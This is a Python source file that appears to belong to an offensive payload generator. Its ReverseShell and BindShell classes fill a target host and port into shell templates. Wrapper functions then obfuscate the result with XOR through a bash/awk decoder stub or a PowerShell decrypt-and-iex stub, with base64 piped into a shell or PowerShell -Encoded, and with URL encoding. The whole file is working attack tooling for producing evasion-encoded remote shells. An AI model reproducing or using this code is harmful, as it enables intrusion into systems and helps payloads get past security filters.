from encoders import powershell_base64, xor, to_unicode, to_urlencode
from binascii import hexlify
import platform

def xor_wrapper(name, code, args, shell="/bin/bash"):
    if args.shell is not "":
        shell = args.shell
    if "powershell" not in name.lower():
        code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
        code = shell + " -c '" + code + "'"
    else:
        prefix, xcode = code.split("-Command")
        pcode = xcode.replace("'", "")
        pcode = pcode.replace("\\", "")

        code = to_unicode(pcode)
        code = xor(code, args.xor) # XOR encode using random key <--
        code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
        code = """$k={0};$b="{1}";$d=[Convert]::FromBase64String($b);$dd=foreach($byte in $d) {{$byte -bxor $k}};$dm=[System.Text.Encoding]::Unicode.GetString($dd);iex $dm""".format(args.xor, code) # Decryption stub
        code= prefix + "-Command " + "'%s'" % code
    return code

def base64_wrapper(name, code, args,shell="/bin/bash"):
    if args.shell is not "":
        shell = args.shell
    if args.base64 is True:
        if "powershell" not in name.lower():
            code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
        else:
            # Powershell encoding code
            prefix, xcode = code.split("-Command")
            pcode = xcode.replace("'", "") # Remove single quotes from -Command
            pcode = pcode.replace("\\", "") # remove string quotation
            code = prefix + "-Encoded " + powershell_base64(pcode)
    return code

class ReverseShell(object):
    def __init__(self, name, args, code):
        self.name = name
        self.args = args
        self.host = args.host
        self.port = args.port
        self.code = code

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
        
        # Apply xor encoding.
        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply URL-encoding
        if self.args.urlencode is True:
            self.code = to_urlencode(self.code)
        
        return self.code

class BindShell(object):
    def __init__(self, name, args, code):
        self.name = name
        self.args = args
        self.port = args.port
        self.code = code

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        self.code = self.code.replace("PORT", str(self.port))

        # Apply xor encoding.
        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply url-encoding
        if self.args.urlencode is True:
            self.code = to_urlencode(self.code)
        
        return self.code

class OperationalSystem(object):
    def __init__(self):
        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"
